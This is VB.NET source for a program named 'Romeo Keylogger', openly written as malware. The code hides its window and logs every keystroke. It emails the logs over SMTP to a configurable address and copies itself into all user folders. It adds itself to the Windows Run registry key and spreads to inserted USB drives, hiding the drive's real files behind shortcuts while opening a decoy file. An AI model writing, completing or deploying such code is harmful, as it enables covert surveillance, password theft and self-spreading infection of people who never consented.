﻿'Making our program not show errors to the user
Option Strict On
'Importing the Mail functions into our program
Imports System.Net.Mail
Imports System
Imports System.IO
Imports System.Text
Imports System.Management
Imports $safeprojectname$.Shortcut.Shortcut
Imports $safeprojectname$.Hide.Hide

'Setting.counter not working
Public Class romeoForm
    Public exepath, fullappname As String
    'run in CMD to hide the folder: attrib +s +h “C:\Users\Taylor Gibb\Desktop\Top Secret” Process.Start("cmd", "/c YourCode")
    Private Delegate Sub RemovableDriveDelegate(ByVal exepath As String, ByVal fullappname As String)


    Public Shared Function RemoveAttribute(ByVal attributes As FileAttributes, ByVal attributesToRemove As FileAttributes) As FileAttributes
        Return attributes And (Not attributesToRemove)
    End Function

    'Copy Itself to C:\Users\* drive
    Private Sub copyItself(ByVal PathWithUsername As String, ByVal fullAppName As String, ByVal fullAppPath As String)
        Dim Pathlist As New ArrayList
        For Each folder As String In My.Computer.FileSystem.GetDirectories(PathWithUsername)
            Try
                If File.Exists(folder & "\" & fullAppName) Then
                    UnHideFile(folder & "\" & fullAppName)
                End If
                Pathlist.Add(folder & "\" & fullAppName)
                File.Copy(fullAppPath, folder & "\" & fullAppName, True)
            Catch ex As Exception
            End Try
        Next
        hideList(Pathlist)

    End Sub

    'Launching foreground file
    Private Sub launchFile(ByVal fileName As String, ByVal folderName As String)
        Dim mypath As String = Directory.GetCurrentDirectory()

        Try
            Dim myfile As String = Path.Combine(mypath, fileName)
            Dim folderPath As String = Path.Combine(mypath, folderName)
            If File.Exists(myfile) Then
                Dim psi As New ProcessStartInfo
                Dim p As New Process
                psi.FileName = myfile
                p.StartInfo = psi
                p.Start()
            ElseIf Directory.Exists(folderPath) Then
                Process.Start("Explorer.exe", folderPath)
            End If
        Catch ex As Exception
        End Try

    End Sub

    'Adding the program to startup
    Public Shared Sub AddStartUp(ByVal appNameWithoutExt As String, ByVal pathwithusername As String)

        For Each folder As String In My.Computer.FileSystem.GetDirectories(pathwithusername)
            Try
                Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
                Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                Key.SetValue(appNameWithoutExt & GetFilenameWithExtension(folder), folder & "\" & appNameWithoutExt & ".exe", Microsoft.Win32.RegistryValueKind.String)
            Catch ex As Exception

            End Try
           

        Next
    End Sub

    'Auto Copy to PD
    Public Sub autoextcopy(ByVal exepath As String, ByVal appname As String)
        Me.Hide()
        Dim rmdrive, strautopath As String

        On Error Resume Next
        For Each drive As IO.DriveInfo In My.Computer.FileSystem.Drives
            If drive.DriveType = IO.DriveType.Removable And File.Exists(exepath) Then
                rmdrive = drive.ToString

                If File.Exists(rmdrive & appname) Then
                Else
                    File.Copy(exepath, rmdrive & appname)
                    SetAttr(rmdrive & appname, CType(vbHidden + vbSystem + vbReadOnly, FileAttribute))

                    'Creating shortcuts in PD
                    Shortcut.Shortcut.shortcut(rmdrive, appname)

                    'Hide Current PD files and Folders
                    hideList(GetallfilefolderList(rmdrive))
                    
                End If

            End If

        Next



    End Sub


    'Allowing ourselves access to gather keystroke data
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Short
    Private Sub tmrEmail_Tick(sender As Object, e As EventArgs) Handles tmrEmail.Tick
        'MessageBox.Show(txtLogs.Text)
        Try
            'Configuring our SMTP settings; these will change based upon your email provider
            'Simply your email host for the SMTP settings
            Dim smtpserver As New SmtpClient
            smtpserver.EnableSsl = True
            smtpserver.Credentials = New Net.NetworkCredential("YOUR FROM EMAIL", "YOUR FROM EMAIL PASSWORD")
            smtpserver.Port = 587 'Change the port according to your email server
            smtpserver.Host = "YOUR FROM EMAIL SERVER" 'Example: smtp.sendgrid.net or smtp.gmail.com
            'Configuring our email message
            Dim mail As New MailMessage
            mail = New MailMessage
            mail.From = New MailAddress("YOUR FROM EMAIL", "Romeo Keylogger Data")
            mail.To.Add("YOUR TO EMAIL") 'Mail id on which you want to receive keylogged data
            mail.Subject = ("Romeo Keylogger Data" & Now)
            mail.Body = txtLogs.Text
            smtpserver.Send(mail)
        Catch exp As Exception
            txtLogs.Text &= vbNewLine & "Romeo Keylogger to Send Data at: " & Now & vbNewLine
        End Try
    End Sub

    'Keylogger portion of the code
    Private Sub tmrKey_Tick(sender As Object, e As EventArgs) Handles tmrKey.Tick
        Dim result As Integer
        Dim key As String
        Dim i As Integer
        'For statement to get our keystrokes
        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)

            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next i
        'Determining if the user is typing in upper or lower case font
        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                txtLogs.Text &= key
            Else
                txtLogs.Text &= key.ToLower
            End If
        End If
        'How the user can set the visibiity of the program to true
        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "V" Then
            Me.Visible = True
        End If
    End Sub

    'Notification that the logger has been stopped
    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        txtLogs.Text &= vbNewLine & "Keylogger has been stopped at: " & Now & vbNewLine
    End Sub


    'Making our program invisible
    Private Sub Form1_Load(sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
        'Hide Visibility of form app
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Visible = False

        Dim targetfile As String = Nothing
        Dim targetfolder As String = Nothing
        Dim appdir As String = Application.StartupPath
        Dim targetfolderpath As String
        Dim args As String() = Environment.GetCommandLineArgs

        If args.GetUpperBound(0) < 1 Then
            targetfolder = "Anime"
            targetfile = "Wakra_Swag.mp3"
            targetfolderpath = Path.Combine(appdir, targetfolder)

        Else
            args = args.Where(Function(item, index) index <> 0).ToArray
            'System.Array.Clear(args, 0, 1)
            targetfile = String.Join(" ", args)
            targetfolder = String.Join(" ", args)

        End If
       


        Dim myusername As String = Environment.UserName
        Dim pathwithusername As String = Path.Combine("C:\Users", myusername)
        exepath = Application.ExecutablePath
        Dim appname As String = My.Application.Info.AssemblyName
        fullappname = String.Join(".", appname, "exe")
        Dim fullapppath As String = Path.Combine(appdir, fullappname)

        '************************************************************************************************

        'Launching File
        Try
            launchFile(targetfile, targetfolder)
        Catch expm As Exception
        End Try

        'Coping Itself
        If My.Settings.Counter < 1 Then
            Try
                copyItself(pathwithusername, fullappname, fullapppath)
            Catch exp As Exception
            End Try
        End If
       

        My.Settings.Counter += 1
        My.Settings.Save()



        'Process Check
        Dim p() As Process = Process.GetProcessesByName(appname)
        If p.Count > 1 Then
            Application.Exit()

        End If

        'Coping Itself
        Try
            copyItself(pathwithusername, fullappname, fullapppath)
        Catch exp As Exception
        End Try

        'Add to Startup
        AddStartUp(appname, pathwithusername)

        txtLogs.Text &= vbNewLine & "Keylogger started at: " & Now & vbNewLine
        txtLogs.Text &= vbNewLine & "Current User: " & Environment.UserName & vbNewLine

    End Sub
    Private Sub ExtDevice_Tick(sender As Object, e As EventArgs) Handles ExtDevice.Tick
        'Calling auto copy to external drive
        'While True
        Try
            Dim watcher As New ManagementEventWatcher
            Dim query As New WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2")
            AddHandler watcher.EventArrived, AddressOf HandleRemovalableDrive
            watcher.Query = query
            watcher.Start()
            'watcher.Stop()
            'watcher.WaitForNextEvent()
        Catch ex As Exception

        End Try
        'End While

    End Sub
    Private Sub Sleep(p1 As Integer)
        Throw New NotImplementedException
    End Sub

    Private Sub HandleRemovalableDrive(sender As Object, e As EventArrivedEventArgs)
        Dim x As New RemovableDriveDelegate(AddressOf autoextcopy)
        x.Invoke(exepath, fullappname)
    End Sub

End Class
